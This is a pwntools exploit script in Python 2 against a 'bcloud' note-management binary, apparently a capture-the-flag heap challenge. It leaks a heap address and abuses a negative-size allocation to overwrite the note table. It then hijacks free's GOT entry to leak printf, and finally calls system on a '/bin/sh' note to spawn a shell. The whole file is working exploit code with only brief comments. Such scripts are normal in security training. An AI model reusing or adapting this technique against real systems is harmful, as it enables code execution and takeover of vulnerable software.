from pwn import *
import time

def new_note(length, content):
    global p
    p.recvuntil("--->>\n")
    p.sendline("1")                     #should be sendline!
    print p.recvuntil('the note content:')
    p.sendline(length)
    print p.recvuntil('the content:')
    if len(content)> 0 and content[-1]=='\n':
        p.send(content)
    else:
        p.sendline(content)

def edit_note(noteid, content):
    global p
    p.recvuntil("--->>\n")
    p.sendline("3")                     #should be sendline!
    print p.recvuntil('the id:')
    p.sendline(noteid)
    print p.recvuntil('the new content:')
    if len(content)>0 and content[-1] == '\n':
        p.send(content)
    else:
        p.sendline(content)

def del_note(noteid, leak = False):
    global p
    print p.recvuntil("--->>\n")
    p.sendline("4")                     #should be sendline!
    print p.recvuntil('the id:')
    p.sendline(noteid)
    if leak:
        return p.recvuntil('Quit\n')

def bye():
    global p
    p.recvuntil("--->>\n")
    p.sendline("6")                     #should be sendline!

    print p.recvuntil("Bye!\n")


context.arch='i386'
context.os='linux'
context.endian='little'
context.word_size=32
#context.log_level = 'debug'

elf = ELF('./bcloud')

p = process("./bcloud")

gdb.attach(proc.pidof(p)[0],  'b *0x80489ae\nc\n')

name = 'a'*64
org = 'b'*64
host= '\xff\xff\xff\xff' 

p.recvuntil("name:\n")
p.send(name)                      #should be send()
s = p.recvline()
leakAddr = u32(s[68:72])
print 'leak addr:', hex(leakAddr)

p.recvuntil("Org:\n")
p.send(org)                   #should be send()

p.recvuntil("Host:\n")
p.sendline(host)                  #should be sendline()

# malloc 1st note 
print "=== 1 new note"
new_note('64', '')

# malloc 2nd note 
print "=== 2 new note"
new_note('64', '')

# malloc 3th note 
print "=== 3 new note"
new_note('64', '')

# malloc 4th note 
print "=== 4 new note"
new_note('64', '/bin/sh')

# get got info
#plt_puts = elf.symbols['puts']
plt_printf = elf.plt['printf']
got_free = elf.got['free']
got_printf = elf.got['printf']

# malloc 5th note, it's negative size, and  0x804b120 record all notes's addresses 
heapBase = leakAddr - 8  
pos = 0x804b120 - (heapBase+0x48*3+0x48*4+16) 
payload1 = ''
print '=== 5 new note, pos:', pos
new_note(str(pos), payload1)

# malloc 6th note, 
print "=== 6 new note"
new_note('64', '')


print "=== 7 edit the 6th note"
payload2 = p32(got_free) + p32(got_printf) 
for i in payload2:
   print hex(ord(i)),
print 'len=', len(payload2)
edit_note('5', payload2)


print "=== 8 edit the 1st note"
edit_note('0', p32(plt_printf))

#leak printf address
print "=== 9 del note"
leak_str= del_note('1', True)
printf_leak_addr = u32(leak_str[1:5])

print 'printf_leak_addr =', hex(printf_leak_addr)

#compute system address
sysaddr = printf_leak_addr - (0x4d410 - 0x40310) 

print "=== 10 edit note"
#replace free with 
edit_note('0', p32(sysaddr))

print "=== 11 del note"
#get shell
del_note('3')


p.interactive()


